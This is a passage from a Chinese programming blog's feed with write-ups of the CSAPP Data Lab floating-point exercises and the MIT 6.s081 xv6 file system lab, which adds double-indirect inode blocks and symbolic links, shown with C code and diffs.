punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>absx <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    absx <span class="token operator">=</span> absx <span class="token operator">>></span> b1<span class="token punctuation">;</span>    b0 <span class="token operator">=</span> absx<span class="token punctuation">;</span>    <span class="token keyword">return</span> b16 <span class="token operator">+</span> b8 <span class="token operator">+</span> b4 <span class="token operator">+</span> b2 <span class="token operator">+</span> b1 <span class="token operator">+</span> b0 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h1><h2 id="思路-10"><a href="#思路-10" class="headerlink" title="思路"></a>思路</h2><p>这题主要是要对规格化数和非规格化数进行分类讨论：</p><p>当 uf 为规格化数，即阶码不为 0 时，乘二相当于将阶码位加 1。</p><p>当 uf 为非规格化数，即阶码为 0 时，此时 uf 的值完全由尾数来表示，且不含隐含 0，因此乘二相当于将尾数乘二，即左移 1 位。</p><p>需要注意的是，当 uf 为非规格化数且尾数最高位为 1 时，尾数左移会导致最高位的 1 移动到阶码的最低位。但经过验证，此时的结果仍然符合预期，即非规格化数无缝衔接到了规格化数，不禁感叹 IEEE 754 标准浮点数的设计之精妙。</p><h2 id="代码-10"><a href="#代码-10" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token function">floatScale2</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> uf<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> t <span class="token operator">=</span> <span class="token punctuation">(</span>uf <span class="token operator">>></span> <span class="token number">23</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span>  <span class="token comment">// 阶码</span>    <span class="token keyword">unsigned</span> m <span class="token operator">=</span> uf <span class="token operator">&amp;</span> <span class="token number">0x7fffff</span><span class="token punctuation">;</span>      <span class="token comment">// 尾数</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">==</span> <span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token keyword">return</span> uf<span class="token punctuation">;</span>        <span class="token comment">// 无穷大或者 NaN</span>    <span class="token comment">// 非规格化数</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">==</span> <span class="token number">0x00</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        m <span class="token operator">&lt;&lt;=</span> <span class="token number">1</span><span class="token punctuation">;</span>        uf <span class="token operator">&amp;=</span> <span class="token number">0xff800000</span><span class="token punctuation">;</span>        uf <span class="token operator">|=</span> m<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 规格化数</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        t <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>        uf <span class="token operator">&amp;=</span> <span class="token number">0x807fffff</span><span class="token punctuation">;</span>        uf <span class="token operator">|=</span> <span class="token punctuation">(</span>t <span class="token operator">&lt;&lt;</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> uf<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="floatFloat2Int"><a href="#floatFloat2Int" class="headerlink" title="floatFloat2Int"></a>floatFloat2Int</h1><h2 id="思路-11"><a href="#思路-11" class="headerlink" title="思路"></a>思路</h2><p>首先确定整数所能表示的上下界的值：当阶码小于 127，即指数位小于 0 时，此时浮点数 uf 小于 1，对应的整数为 0；当阶码大于 150，即指数位大于 23 时，此时单精度浮点数的精度（尾数长度）不足以正确表示对应的整数，返回 0x80000000。</p><p>对于在合理范围内的 uf，将其转换为对应的整数，首先需要尾数最高位的高一位加上规格化数隐含的 1，再根据阶码的大小将尾数进行右移，阶码越大，右移位数越少。最后根据符号位的值选择是否将结果取反加一。</p><h2 id="代码-11"><a href="#代码-11" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">floatFloat2Int</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> uf<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> s <span class="token operator">=</span> <span class="token punctuation">(</span>uf <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x1</span><span class="token punctuation">;</span>   <span class="token comment">// 符号</span>    <span class="token keyword">unsigned</span> t <span class="token operator">=</span> <span class="token punctuation">(</span>uf <span class="token operator">>></span> <span class="token number">23</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span>  <span class="token comment">// 阶码</span>    <span class="token keyword">unsigned</span> m <span class="token operator">=</span> uf <span class="token operator">&amp;</span> <span class="token number">0x7fffff</span><span class="token punctuation">;</span>      <span class="token comment">// 尾数</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    <span class="token comment">// 小于 1</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">&lt;</span> <span class="token number">127</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        val <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 大于 1 且不溢出</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">&lt;=</span> <span class="token number">150</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        val <span class="token operator">=</span> m <span class="token operator">|</span> <span class="token number">0x800000</span><span class="token punctuation">;</span>        val <span class="token operator">>>=</span> <span class="token punctuation">(</span><span class="token number">23</span> <span class="token operator">-</span> <span class="token punctuation">(</span>t <span class="token operator">-</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            val <span class="token operator">=</span> <span class="token operator">~</span>val <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 溢出</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        val <span class="token operator">=</span> <span class="token number">0x80000000</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> val<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="floatPower2"><a href="#floatPower2" class="headerlink" title="floatPower2"></a>floatPower2</h1><h2 id="思路-12"><a href="#思路-12" class="headerlink" title="思路"></a>思路</h2><p>同样是对规格化数和非规格化数的分类讨论：</p><p>当 <code>x &gt;= -150 &amp;&amp; x &lt; -127</code> 时，结果为非规格化数，此时浮点数表示只有一个位为 1，其余全为 0。直接根据指数 x 的值确定该位的位置即可。</p><p>当 <code>x &gt;= -127 &amp;&amp; x &lt; 128</code> 时，结果为规格化数，此时浮点数表示的尾数全为 0，只有阶码用来表示指数的值。根据指数 x 的值确定阶码的值，然后构造出浮点数即可。</p><h2 id="代码-12"><a href="#代码-12" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token function">floatPower2</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> val<span class="token punctuation">;</span>    <span class="token comment">// 太小</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> <span class="token operator">-</span><span class="token number">150</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        val <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 非规格化数</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> <span class="token operator">-</span><span class="token number">127</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        val <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">150</span> <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 规格化数</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">unsigned</span> t <span class="token operator">=</span> x <span class="token operator">+</span> <span class="token number">127</span><span class="token punctuation">;</span>        val <span class="token operator">|=</span> <span class="token punctuation">(</span>t <span class="token operator">&lt;&lt;</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 太大</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        val <span class="token operator">=</span> <span class="token number">0x7f800000</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> val<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;CSAPP 的第一个 Lab，对应知识点为书中的第 2 章（信息的表示与处理），要求使用受限制的运算符和表达式实现一些位操作。主要分为两个部分：整数部分和浮点数部分。其中整数部分限制较多，比较偏重技巧性，部分题个人认为很有难度。而浮点数部分则比较基础，主要考察对 IEEE 754 标准的熟悉程度，代码较长，但思路相对简单。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    <category term="位运算" scheme="http://lordaeronesz.github.io/tags/%E4%BD%8D%E8%BF%90%E7%AE%97/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.s081 2021 Lab File system</title>
    <link href="http://lordaeronesz.github.io/2024/08/16/MIT6.s081-2021-Lab%20File%20system/"/>
    <id>http://lordaeronesz.github.io/2024/08/16/MIT6.s081-2021-Lab%20File%20system/</id>
    <published>2024-08-16T03:45:11.000Z</published>
    <updated>2024-08-16T10:21:40.483Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Large-files"><a href="#Large-files" class="headerlink" title="Large files"></a>Large files</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>xv6 文件系统的 inode 中地址域 <code>addrs[]</code> 由 12 个直接地址和 1 个一级间接地址组成，本实验要求将地址域更改为 11 个直接地址、1 个一级间接地址和 1 个二级间接地址组成，以支持更大文件的存储。</p><p>代码的实现有了直接地址和一级间接地址做参考，就很简单了，直接查看代码部分即可。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/kernel/file.h b/kernel/file.hindex b076d1d..5c4eb3a 100644<span class="token coord">--- a/kernel/file.h</span><span class="token coord">+++ b/kernel/file.h</span>@@ -26,7 +26,7 @@ struct inode &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  short minor;</span><span class="token prefix unchanged"> </span><span class="token line">  short nlink;</span><span class="token prefix unchanged"> </span><span class="token line">  uint size;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  uint addrs[NDIRECT+1];</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  uint addrs[NDIRECT+2];</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// map major device number to device functions.</span></span>diff --git a/kernel/fs.c b/kernel/fs.cindex 40c9bd4..4c00ab5 100644<span class="token coord">--- a/kernel/fs.c</span><span class="token coord">+++ b/kernel/fs.c</span>@@ -400,6 +400,33 @@ bmap(struct inode *ip, uint bn)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    brelse(bp);</span><span class="token prefix unchanged"> </span><span class="token line">    return addr;</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  bn -= NINDIRECT;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  if (bn &lt; NINDIRECT2) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    if ((addr = ip->addrs[NDIRECT + 1]) == 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">      ip->addrs[NDIRECT + 1] = addr = balloc(ip->dev);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    uint i = bn / NINDIRECT, j = bn % NINDIRECT;</span><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    bp = bread(ip->dev, addr);</span><span class="token prefix inserted">+</span><span class="token line">    a = (uint *)bp->data;</span><span class="token prefix inserted">+</span><span class="token line">    if ((addr = a[i]) == 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">      a[i] = addr = balloc(ip->dev);</span><span class="token prefix inserted">+</span><span class="token line">      log_write(bp);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    brelse(bp);</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    bp = bread(ip->dev, addr);</span><span class="token prefix inserted">+</span><span class="token line">    a = (uint *)bp->data;</span><span class="token prefix inserted">+</span><span class="token line">    if ((addr = a[j]) == 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">      a[j] = addr = balloc(ip->dev);</span><span class="token prefix inserted">+</span><span class="token line">      log_write(bp);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    brelse(bp);</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    return addr;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  panic("bmap: out of range");</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>@@ -432,6 +459,29 @@ itrunc(struct inode *ip)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    ip->addrs[NDIRECT] = 0;</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  struct buf *bp2;</span><span class="token prefix inserted">+</span><span class="token line">  uint *a2;</span><span class="token prefix inserted">+</span><span class="token line">  if (ip->addrs[NDIRECT + 1]) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    bp = bread(ip->dev, ip->addrs[NDIRECT + 1]);</span><span class="token prefix inserted">+</span><span class="token line">    a = (uint *)bp->data;</span><span class="token prefix inserted">+</span><span class="token line">    for (i = 0; i &lt; NINDIRECT; ++i) &#123;</span><span class="token prefix inserted">+</span><span class="token line">      if (a[i]) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        bp2 = bread(ip->dev, a[i]);</span><span class="token prefix inserted">+</span><span class="token line">        a2 = (uint *)bp2->data;</span><span class="token prefix inserted">+</span><span class="token line">        for (j = 0; j &lt; NINDIRECT; ++j) &#123;</span><span class="token prefix inserted">+</span><span class="token line">          if (a2[j]) &#123;</span><span class="token prefix inserted">+</span><span class="token line">            bfree(ip->dev, a2[j]);</span><span class="token prefix inserted">+</span><span class="token line">          &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        brelse(bp2);</span><span class="token prefix inserted">+</span><span class="token line">        bfree(ip->dev, a[i]);</span><span class="token prefix inserted">+</span><span class="token line">      &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    brelse(bp);</span><span class="token prefix inserted">+</span><span class="token line">    bfree(ip->dev, ip->addrs[NDIRECT + 1]);</span><span class="token prefix inserted">+</span><span class="token line">    ip->addrs[NDIRECT + 1] = 0;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  ip->size = 0;</span><span class="token prefix unchanged"> </span><span class="token line">  iupdate(ip);</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/kernel/fs.h b/kernel/fs.hindex 139dcc9..cd5de8a 100644<span class="token coord">--- a/kernel/fs.h</span><span class="token coord">+++ b/kernel/fs.h</span>@@ -24,9 +24,10 @@ struct superblock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">#define FSMAGIC 0x10203040</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">#define NDIRECT 12</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define NDIRECT 11</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define NINDIRECT (BSIZE / sizeof(uint))</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">#define MAXFILE (NDIRECT + NINDIRECT)</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define NINDIRECT2 (NINDIRECT * NINDIRECT)</span><span class="token prefix inserted">+</span><span class="token line">#define MAXFILE (NDIRECT + NINDIRECT + NINDIRECT2)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// On-disk inode structure</span><span class="token prefix unchanged"> </span><span class="token line">struct dinode &#123;</span></span>@@ -35,7 +36,7 @@ struct dinode &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  short minor;          // Minor device number (T_DEVICE only)</span><span class="token prefix unchanged"> </span><span class="token line">  short nlink;          // Number of links to inode in file system</span><span class="token prefix unchanged"> </span><span class="token line">  uint size;            // Size of file (bytes)</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  uint addrs[NDIRECT+1];   // Data block addresses</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  uint addrs[NDIRECT+2];   // Data block addresses</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// Inodes per block.</span></span></code></pre><h1 id="Symbolic-links"><a href="#Symbolic-links" class="headerlink" title="Symbolic links"></a>Symbolic links</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>本实验要求为 xv6 实现符号链接（软链接）机制，符号链接本质上也是一个文件，只不过它的数据内容为该链接指向的文件路径，这其实与 Windows 系统的快捷方式十分类似。实现方案如下：</p><p>首先依照 Lab System call 中的方法，添加系统调用 <code>symlink</code>：添加 <code>symlink()</code> 声明，添加系统调用号，添加系统调用 entry，添加 <code>sys_symlink()</code> 声明。</p><p>在理解了符号链接的本质后，就可以着手实现 <code>sys_symlink</code> 了。首先明确一下 <code>symlink</code> 的作用，它包含两个参数：target 和 path，作用是创建一个目录为 path 的符号链接，该符号链接指向目录为 target 的文件。实现思路应该比较清晰：使用 <code>create()</code> 创建一个文件类型为符号链接（需要自行定义）的文件，再使用 <code>writei()</code> 将字符串 path 写入该文件中。</p><pre class="language-c" data-language="c"><code class="language-c">uint64 <span class="token function">sys_symlink</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> n1<span class="token punctuation">,</span> n2<span class="token punctuation">;</span>    <span class="token keyword">char</span> target<span class="token punctuation">[</span>MAXPATH<span class="token punctuation">]</span><span class="token punctuation">,</span> path<span class="token punctuation">[</span>MAXPATH<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>ip<span class="token punctuation">;</span>    <span class="token comment">// get arguments of symlink</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n1 <span class="token operator">=</span> <span class="token function">argstr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> target<span class="token punctuation">,</span> MAXPATH<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span>n2 <span class="token operator">=</span> <span class="token function">argstr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> path<span class="token punctuation">,</span> MAXPATH<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">begin_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// create symbol link in the path</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>ip <span class="token operator">=</span> <span class="token function">create</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> T_SYMLINK<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">end_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// write target to file that ip points to</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">writei</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>uint64<span class="token punctuation">)</span>target<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n1<span class="token punctuation">)</span> <span class="token operator">&lt;</span> n1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">end_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">iunlockput</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">end_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>实现了符号链接的创建之后，还需要修改 <code>sys_open()</code>，实现对符号链接的特殊处理：当该文件是一个符号链接并且需要以跟随（follow）的方式打开时，就不断向下递归，将当前的 inode 指针指向符号链接指向文件的 inode，直到 inode 指针对应的文件类型不是符号链接，此时该 inode 指针指向的文件才是本次 <code>sys_open()</code> 系统调用实际需要打开的文件。</p><p>这里要用到两个关键函数 <code>readi()</code> 和 <code>namei()</code>。其中 <code>readi()</code> 能够根据 inode 指针，从该 inode 指针对应的文件中读取数据；而 <code>namei()</code> 能够根据指定的路径，返回该路径对应文件的 inode 指针。“跟随”的基本流程就是先使用读取当前 inode 中的数据，即目标文件路径 path，再将当前 inode 指针指向 path 目录对应的文件，以此往复。</p><p>最后还有一个小细节，就是当多个符号链接形成一个环时，这样的“跟随”过程就可能会导致死循环，因此必须加以限制，这里为了实现的方便，只是设定了一个最大递归深度，当递归深度超过该设定最大值时，文件打开就会失败。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>omode <span class="token operator">&amp;</span> O_NOFOLLOW<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> depth <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>     <span class="token comment">// max recursive depth</span>    <span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>next<span class="token punctuation">;</span> <span class="token comment">// next inode</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>depth <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> ip<span class="token operator">-></span>type <span class="token operator">==</span> T_SYMLINK<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// read data from file that ip points to to path</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">readi</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>uint64<span class="token punctuation">)</span>path<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MAXPATH<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">iunlockput</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">end_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// get inode of file in the path</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>next <span class="token operator">=</span> <span class="token function">namei</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">iunlockput</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">end_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">iunlockput</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>        ip <span class="token operator">=</span> next<span class="token punctuation">;</span>        <span class="token operator">--</span>depth<span class="token punctuation">;</span>        <span class="token function">ilock</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>depth <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">iunlockput</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">end_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/Makefile b/Makefileindex 7a7e380..37a202c 100644<span class="token coord">--- a/Makefile</span><span class="token coord">+++ b/Makefile</span>@@ -188,6 +188,7 @@ UPROGS=\<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">$U/_grind\</span><span class="token prefix unchanged"> </span><span class="token line">$U/_wc\</span><span class="token prefix unchanged"> </span><span class="token line">$U/_zombie\</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">$U/_symlinktest\</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line"></span></span>diff --git a/kernel/fcntl.h b/kernel/fcntl.hindex 44861b9..b42df18 100644<span class="token coord">--- a/kernel/fcntl.h</span><span class="token coord">+++ b/kernel/fcntl.h</span><span class="token coord">@@ -3,3 +3,4 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define O_RDWR    0x002</span><span class="token prefix unchanged"> </span><span class="token line">#define O_CREATE  0x200</span><span class="token prefix unchanged"> </span><span class="token line">#define O_TRUNC   0x400</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define O_NOFOLLOW 0x800</span></span>\ No newline at end of filediff --git a/kernel/stat.h b/kernel/stat.hindex 19543af..46ba47f 100644<span class="token coord">--- a/kernel/stat.h</span><span class="token coord">+++ b/kernel/stat.h</span><span class="token coord">@@ -1,6 +1,7 @@</span><span class="token 